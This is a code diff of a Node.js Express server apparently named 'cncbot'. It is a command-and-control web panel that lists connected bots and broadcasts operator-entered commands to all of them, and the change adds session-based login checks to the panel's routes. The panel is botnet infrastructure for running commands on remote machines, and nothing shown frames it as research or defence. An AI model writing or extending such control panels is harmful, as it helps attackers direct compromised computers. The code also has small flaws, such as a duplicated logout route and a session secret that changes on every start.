@@ -3,7 +3,9 @@ var path = require('path');
 var favicon = require('serve-favicon');
 var logger = require('morgan');
 var cookieParser = require('cookie-parser');
+var session = require('express-session');
 var bodyParser = require('body-parser');
+var uuid = require('uuid-v4');
 
 var debug = require('debug')('cncbot:server');
 var http = require('http');
@@ -22,6 +24,7 @@ app.use(bodyParser.urlencoded({ extended: false }));
 app.use(cookieParser());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(__dirname + '/node_modules'));
+app.use(session({name: 'MHBOTTOKEN', secret: uuid()}));
 
 
     var port = normalizePort(process.env.PORT || '3000');
@@ -35,25 +38,32 @@ app.use(express.static(__dirname + '/node_modules'));
     server.on('listening', onListening);
     var Websocketserver=require('./Websocketserver')(server);
     var BotSocketServer=require('./BotSocketServer')(Websocketserver);
+var auth = require('./auth');
 
 app.get('/', function(req, res, next) {
+    if (auth.isAuthenticated(req,res)) res.redirect('/index');
     res.render('login');
 });
-app.get('/index',function (req,res,next) {
+app.post('/login',function (req,res,next) {
+    auth.login(req,res);
+    res.redirect('index');
+});
+app.get('/index', auth.requireToken,function (req,res,next) {
     res.render('index1');
 });
-app.post('/index-cmd',function (req,res) {
+
+app.post('/index-cmd', auth.requireToken,function (req,res) {
     console.log(req.body);
     let cmd = req.body.cmd;
     BotSocketServer.broadcastCmd(cmd);
 });
-app.get('/logout',function (req,res,next) {
+app.get('/logout', auth.requireToken,function (req,res,next) {
     res.render('login');
 });
-app.get('/charts',function (req,res,next) {
+app.get('/charts', auth.requireToken,function (req,res,next) {
     res.render('charts');
 });
-app.get('/tables',function (req,res,next) {
+app.get('/tables', auth.requireToken,function (req,res,next) {
     BotSocketServer.getAllConnections(function (callback) {
         res.render('tables',{
             connections: callback
@@ -62,10 +72,10 @@ app.get('/tables',function (req,res,next) {
     });
 
 });
-app.get('/logout',function (req,res,next) {
+app.get('/logout', auth.requireToken,function (req,res,next) {
     res.render('login');
 });
-app.get('/command/:id',function(req,res,next){
+app.get('/command/:id', auth.requireToken,function(req,res,next){
     BotSocketServer.getConnectionById(req.params.id,function (connection) {
         console.log(JSON.stringify(connection)+'selam control merhaba');
         if(connection!=null){
